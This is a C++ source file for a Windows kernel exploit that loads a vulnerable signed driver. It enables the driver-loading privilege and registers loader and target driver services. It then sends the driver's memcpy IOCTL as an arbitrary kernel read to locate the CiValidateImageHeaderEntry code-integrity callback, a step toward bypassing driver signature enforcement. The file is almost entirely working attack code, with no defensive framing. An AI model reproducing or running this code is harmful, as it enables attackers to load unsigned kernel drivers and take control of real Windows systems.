#include "includes.h"
#include "win_api_defs.h"

static NTSTATUS
vuln::TriggerExploit(
    _In_ PWSTR LoaderServiceName,
    _In_ PWSTR DriverServiceName
)
{
	HANDLE DeviceHandle;
    NTSTATUS Status = modules::OpenDeviceHandle( &DeviceHandle, FALSE );

    if ( !NT_SUCCESS( Status ) )
    {
        wprintf( L"[!] Initial device open failed — attempting to load driver: %ls\n", LoaderServiceName );

        Status = modules::LoadDriver( LoaderServiceName );
        if ( !NT_SUCCESS( Status ) )
        {
            wprintf( L"[-] Failed to load driver service %ls. NtLoadDriver: 0x%08X\n", LoaderServiceName, Status );
            return Status;
        }

        Status = modules::OpenDeviceHandle( &DeviceHandle, TRUE );
        if ( !NT_SUCCESS( Status ) || !DeviceHandle )
        {
            wprintf( L"[-] Failed to open device handle after loading %ls. Status: 0x%08X\n", LoaderServiceName, Status );
            return Status;
        }

        wprintf( L"[+] Device handle opened successfully: %p for %ws\n", DeviceHandle, LoaderServiceName );
    }

    seCiCallbacks_swap w = modules::get_CIValidate_ImageHeaderEntry();
    wprintf( L"[!] ciValidateImageHeaderEntry: %p\n", w.ciValidateImageHeaderEntry );
    wprintf( L"[!] zwFlushInstructionCache : %p\n", w.zwFlushInstructionCache );

    if ( !w.ciValidateImageHeaderEntry || !w.zwFlushInstructionCache )
    {
        wprintf( L"[!] Invalid patch or target addresses. Aborting.\n" );
        return STATUS_INVALID_PARAMETER;
    }

	// Set up read operation to read original callback 
	GIOMemcpyInput MemcpyInputR;
	IO_STATUS_BLOCK IoStatusBlockR;
	DWORD64 dataR = NULL;
	ULONG64 targetR = w.ciValidateImageHeaderEntry;
	MemcpyInputR.Src = targetR;
	MemcpyInputR.Dst = ( ULONG64 )&dataR;
	MemcpyInputR.Size = 8;
	// Exploit Read primitive 

	RtlZeroMemory( &IoStatusBlockR, sizeof( IoStatusBlockR ) );
	wprintf( L"Handle: 0x%p", DeviceHandle );
	system( "pause" );
	Status = NtDeviceIoControlFile( DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlockR,
		IOCTL_GIO_MEMCPY,
		&MemcpyInputR,
		sizeof( MemcpyInputR ),
		nullptr,
		0 );
	wprintf( L"[*] Original Callback : %p\n", dataR );
	
	modules::UnloadDriver( LoaderServiceName );
    NtClose( DeviceHandle );
    return Status;
}

NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden )
{
	WCHAR LoaderPath[MAX_PATH] = { 0 };
	WCHAR DriverPath[MAX_PATH] = { 0 };

	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled = FALSE;

	std::wprintf( L"[+] WindLoadDriver called\n" );

	// Step 1: Enable SE_LOAD_DRIVER_PRIVILEGE
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	std::wprintf( L"[+] RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE) -> 0x%08X\n", stat );
	if ( !NT_SUCCESS( stat ) ) {
		std::wprintf( L"[-] Failed to enable SE_LOAD_DRIVER_PRIVILEGE. Are you running as administrator?\n" );
		return stat;
	}

	// Step 2: Expand full paths
	stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
	std::wprintf( L"[+] RtlGetFullPathName_UEx(LoaderName: %ls) -> 0x%08X\n", LoaderName, stat );
	if ( !NT_SUCCESS( stat ) ) {
		std::wprintf( L"[-] Failed to expand LoaderName path.\n" );
		return stat;
	}
	std::wprintf( L"[+] Expanded LoaderPath: %ls\n", LoaderPath );

	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
	std::wprintf( L"[+] RtlGetFullPathName_UEx(DriverName: %ls) -> 0x%08X\n", DriverName, stat );
	if ( !NT_SUCCESS( stat ) ) {
		std::wprintf( L"[-] Failed to expand DriverName path.\n" );
		return stat;
	}
	std::wprintf( L"[+] Expanded DriverPath: %ls\n", DriverPath );

	// Step 3: Create loader driver service
	std::wprintf( L"[+] Creating loader service: %ls\n", LoaderServiceName );
	stat = modules::CreateDriverService( LoaderServiceName, LoaderPath );
	std::wprintf( L"[+] CreateDriverService(Loader) -> 0x%08X\n", stat );
	if ( !NT_SUCCESS( stat ) ) {
		std::wprintf( L"[-] Failed to create loader service: %ls\n", LoaderServiceName );
		return stat;
	}

	// Step 4: Create target driver service
	std::wprintf( L"[+] Creating target driver service: %ls\n", DriverServiceName );
	stat = modules::CreateDriverService( DriverServiceName, DriverPath );
	std::wprintf( L"[+] CreateDriverService(Target) -> 0x%08X\n", stat );
	if ( !NT_SUCCESS( stat ) ) {
		std::wprintf( L"[-] Failed to create target service: %ls\n", DriverServiceName );
		return stat;
	}

	// Step 5: Trigger exploit
	std::wprintf( L"[+] Triggering exploit with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
	vuln::TriggerExploit( LoaderServiceName, DriverServiceName );

	std::wprintf( L"[+] Done!\n" );
	return STATUS_SUCCESS;
}


NTSTATUS vuln::WindUnloadDriver(_In_ PWCHAR DriverName,_In_ BOOLEAN Hidden)
{
	constexpr CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE,TRUE,FALSE,&SeLoadDriverWasEnabled );
	
	if ( !NT_SUCCESS( stat ) )	return stat;

	if ( DriverName != nullptr && Hidden )	modules::CreateDriverService( DriverServiceName, DriverName );

	helpers::FileNameToServiceName( DriverServiceName, DriverName );

	stat = modules::UnloadDriver( DriverServiceName );

	RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, SeLoadDriverWasEnabled, FALSE, &SeLoadDriverWasEnabled );

	return stat;
}